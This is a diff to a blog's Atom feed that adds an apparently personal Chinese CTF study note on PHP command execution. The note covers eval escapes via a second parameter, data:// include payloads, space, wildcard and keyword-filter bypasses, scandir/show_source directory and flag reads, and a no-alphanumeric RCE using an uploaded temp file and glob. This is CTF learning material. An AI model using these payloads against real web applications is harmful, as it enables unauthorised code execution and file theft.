@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-06-03T07:38:02.719Z</updated>
+  <updated>2023-06-27T09:27:58.103Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ctf命令执行小结</title>
+    <link href="http://example.com/2023/06/27/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
+    <id>http://example.com/2023/06/27/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</id>
+    <published>2023-06-27T09:27:58.103Z</published>
+    <updated>2023-06-27T09:27:58.103Z</updated>
+    
+    <content type="html"><![CDATA[<p>个人持续总结中….</p><h3 id="1-基本姿势"><a href="#1-基本姿势" class="headerlink" title="1 基本姿势"></a>1 基本姿势</h3><p>php中提供了三个调用系统命令的函数 ，分别是  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ，exec(&quot;shell&quot;)，passthru</span><br></pre></td></tr></table></figure><p>其中 ， <code>exec</code> 系统命令不返回执行结果 ，需配合 <code>echo</code> 使用 ， 如 <code>echo exec(&quot;ls&quot;);</code></p><p><code>echo exec(&quot;ls&quot;);</code>  也仅仅能返回最后一个数据 ，所以为了返回所有数据 ，可以使用 <code>shell_exec</code></p><p>闭合的 顿号 &#96;  也可以代替 exec 函数 ，不返回执行结果 ，需配合 echo 使用</p><h3 id="2-各种绕过以及其他命令"><a href="#2-各种绕过以及其他命令" class="headerlink" title="2 各种绕过以及其他命令"></a>2 各种绕过以及其他命令</h3><p>(1)cp命令：可将一个文件写入另一个文件 ，如 <code>cp flag.php 1.txt</code>  此时，1.txt文件中即可查看flag</p><p>(2)命令执行中的经典逃逸  </p><p>如果是<code>eval($c)</code>，并且是对 $c  进行了过滤</p><p>那么可以传参 <code>?c=eval($_GET[w]);&amp;w=system(&quot;shell&quot;);</code></p><p>此时，对c进行了过滤并没有检测到 system函数 ，w中的命令可以顺利执行</p><p>或者使用 <code>include</code>函数包含 </p><p>文件包含函数与 php伪协议一起使用，会被当成文件执行 ，如 <code>include</code> ，<code>file_get_contents</code> </p><p>传参</p><p>如果分号被过滤 ，可以使用 ?&gt; 代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[w]?&gt;&amp;w=data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>(3)基本字符绕过</p><p>​     空格绕过： %09 (tab键)，&#x2F; **&#x2F; (注释绕过)，$IFS$9 或者 ${IFS} (linux分隔符)，%0a (linux换行符) ，  &lt; 或者 &lt;&gt; 也可绕过空格</p><p>​通配符绕过：  *  和  ? , * 可代替多个字符 ，? 只能代替单个字符 </p><p>​在某种情况下 ， 可用 <code>/bin/c??</code> 来代替 cat 命令  </p><p>​ <code>/???/????64</code> 来匹配 <code>/bin/base64</code>     </p><p>​\ : linux中可以使用 \ 来表示连接  </p><p>​如果过滤了 flag  可以使用 fl \ag 来绕过  </p><p>(4)</p><p>如果题目进行了超级严格的过滤 ，各种系统命令都被禁用</p><p>那么考虑下面这种方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>不是特别常见的函数</p><p><code>print_r()</code> 函数 打印变量</p><p><code>scandir()</code> 函数 返回指定目录中的文件和数组</p><p> <code>pos()</code> 函数 返回数组中的第一个元素的值</p><p><code>localeconv()</code>  函数 返回包含本地数字及货币格式信息的数组</p><p><code>array_reverse()</code>  函数 将数组元素倒过来</p><p>如果 <code>print_r()</code>  被禁用 ，可以使用 <code>var_dump()</code>函数来查看目录</p><p>或者 使用 <code>c=$a=scandir(&quot;/&quot;);echo $a[6];</code></p><p>上述函数可用来 查看目录</p><p>读取 flag 文件可以使用 <code>show_source()</code> 或者<code>highlight_file()</code>函数 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>(5)无数字字母rce</p><p>当传入的变量 可以执行命令，但是过滤了数字和字母时</p><p>可以考虑接下来这种方案</p><p>先构造一个html脚本，传入shell文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://8f79b818-dffd-4d3e-bab6-7afde656b630.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>（注意修改url网址）</p><p>通过传入参数 ，使用 . 来执行文件</p><p>php 会将上传的临时文件保存在 &#x2F;tmp&#x2F;phpxxxxxx</p><p>如果 . &#x2F;tmp&#x2F;phpxxxxxx 即可执行该文件</p><p>根据 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">p神</a> 的解释 ，如果使用 &#x2F;???&#x2F;?????? 可能会匹配到多个文件，无法正确执行</p><p>glob 中支持使用 [0-9] 的方式来表示一个范围 </p><p>而且干扰文件中所有文件名都是小写，只有PHP生产的临时文件包含大写字母</p><p>(补充：并不是所有文件的最后一个字符都是大写 ，因为文件名是随机生成，所以有时需要多试几次，直到文件名最后一位是大写为止)</p><p>在ASCII码表中， 大写字母位于 @ 和 [ 之间</p><p>那么，使用 &#x2F;???&#x2F;????????[@-[]  即可匹配到我们传入的临时文件</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;个人持续总结中….&lt;/p&gt;
+&lt;h3 id=&quot;1-基本姿势&quot;&gt;&lt;a href=&quot;#1-基本姿势&quot; class=&quot;headerlink&quot; title=&quot;1 基本姿势&quot;&gt;&lt;/a&gt;1 基本姿势&lt;/h3&gt;&lt;p&gt;php中提供了三个调用系统命令的函数 ，分别是  &lt;/p&gt;
+&lt;figure</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>2021第五空间Web复现</title>
